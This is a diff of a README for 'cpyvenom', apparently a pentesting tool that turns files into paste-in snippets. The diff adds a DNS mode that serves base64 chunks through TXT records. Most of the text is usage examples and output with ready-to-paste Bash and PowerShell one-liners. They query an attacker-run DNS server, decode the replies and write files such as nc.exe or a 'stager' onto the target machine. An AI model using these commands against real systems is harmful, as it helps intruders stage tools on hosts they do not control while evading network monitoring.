@@ -1,6 +1,20 @@
+ ## Script to transfer files with a copy/paste from terminal when only few options are available
 
 
- ### Script to transfer files with a simple copy/paste from terminal when no other options are available
+
+
+### Added DNS Upload
+
+Added the possibility to upload file through DNS TXT record requests, the script will open a mini-dns server to serve the file in base64 chunks inside parametrized TXT-record response.
+
+**Prerequisites:**
+* **The port must be reachable from the internet**
+* **To listen on port 53 you will need to execute the script as root.**
+* **it depends on dnslib**  
+
+<br />
+<br />
+
  
 * Yet another pentesting script
 
@@ -24,23 +38,51 @@ Usage: cpyvenom.py -p <payload> -i <inputfile> -d <destination> -o <save_to_outp
 
 Available commands:
 
-    -p / --payload          windows/powershell, windows/certutil, linux/bash, linux/python
+    -p / --payload          windows/powershell, windows/certutil, linux/bash, linux/python, 
+                            dns/powershell, dns/bash
 
     -i / --input-file       file path to send
 
-    -o / --output-file      save output to file, default to stdout
+    -o / --output-file      save the encoded output to file, default to stdout
 
-    -d / --destination      destination FULL PATH (folder + filename) in the remote system
+    -d / --destination      destination path in the remote system
 
     -b / --block            size of the block
 
+    ____________________________________
+
+    Arguments that work only on dns payloads:
+
+    -P / --port             the DNS Server listening port
+    
+    --udp /--tcp            Connection method
+    
+    --dns-ip                dns domain or IP address to query
+    
+    --sleep                 delay between requests (seconds, default 1)
+    
+    --no-server             print the snippet without setup the listening server
+
+
     Example:
 
-        convert a windows file:
-            cpyvenom -i nc.exe -o nc.cpyvenom -p winows/powershell -d "C:\\temp\\nc.exe"
+        windows:
+            python3 cpyvenom.py -i nc.exe -o nc.cpyvenom -p windows/powershell -d "C:\\temp\\nc.exe"
 
-        convert a linux file:
-            cpyvenom -i /bin/nc -o nc.cpv -p linux/bash -d /tmp/nc.elf
+        linux:
+            python3 cpyvenom.py -i /bin/nc -o nc.cpv -p linux/bash -d /tmp/nc
+
+
+    DNS payload Examples:
+        
+        windows:
+            sudo python3 cpyvenom.py -p dns/powershell --input-file=nc.exe -d "c:\\temp\\nc.exe"  --dns-ip=192.168.1.254 --port=53 
+        
+        linux:
+            sudo python3 cpyvenom.py -p dns/bash --input-file=stager -d "/tmp/stager"  --dns-ip=192.168.1.254 --port=53
+        
+
+
 ```
 
 
@@ -48,7 +90,7 @@ Example:
 
 ```
 
-./cpyvenom.py -p windows/powershell -i simpleapp.exe -d c:\\temp\\simpleapp.exe
+python3 cpyvenom.py -p windows/powershell -i simpleapp.exe -d c:\\temp\\simpleapp.exe
 Input file is  simpleapp.exe
 Output file is StdOut
 Payload  windows/powershell
@@ -68,22 +110,70 @@ $EncodedString+="AAAAAAAAAAAAABACACgEAAAApQEAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 $EncodedString+="cD94P5Q/nD/oP/Q/ALABABQAAABUMFgwdDB4MJQwmDAA8AEADAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
 $EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
 $EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
-$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
 $EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" 
 $ByteArray = [System.Convert]::FromBase64String($EncodedString);
 [System.IO.File]::WriteAllBytes($FilePath, $ByteArray);
 
 ```
 
+DNS upload the file README.md to a linux machine example:
+```
+sudo python3 cpyvenom.py -p dns/bash --input-file=README.md -d "/tmp/README.md"  --dns-ip=192.168.1.254 --port=53
+Input file is  README.md
+Output file is  StdOut
+Payload  dns/bash
+Destination /tmp/stager
+Preparing file chunks...
+
+Copy from here:
+
+**********
+
+for n in $(seq 0 30);do echo "dig txt +short c$n @192.168.1.254  & sleep 1" ;done | sh | tr -d '"' | base64 -d > /tmp/README.md
+
+**********
+
+Starting nameserver...^C to stop.
+
+```
+
+
+
+DNS upload the file nc.exe to a windows machine example:
+```
+sudo python3 cpyvenom.py -p dns/powershell --input-file=nc.exe -d "c:\\temp\\nc.exe"  --dns-ip=192.168.1.254  --port=53
+Input file is  nc.exe
+Output file is  StdOut
+Payload  dns/powershell
+Destination c:\temp\nc.exe
+Preparing file chunks...
+
+Copy from here:
+
+**********
+
+$FilePath="c:\temp\nc.exe"
+$EncodedString =  '' 
+for ($num = 1 ; $num -le 10 ; $num++){$current='c'+$num.ToString()+'.com'; $EncodedString+=(Resolve-DnsName $current -Server 192.168.1.254 | Select-Object -Property Strings ).Strings ;Start-Sleep -s 1 };
+$ByteArray = [System.Convert]::FromBase64String($EncodedString);
+[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);
+
+**********
+
+Starting nameserver...^C to stop
+
+
+```
+
+
+Once the mini-DNS server has started, paste the 'for' snippet to remote machine, it will download the file with concatenating of TXT-record base64 encoded response
+
+
+
+
+Credits:
+https://stackoverflow.com/questions/16977588/reading-dns-packets-in-python
+https://floatingpoint.sorint.it/blog/post/introduction-to-dns-exfiltration-and-infiltration
 
 
 
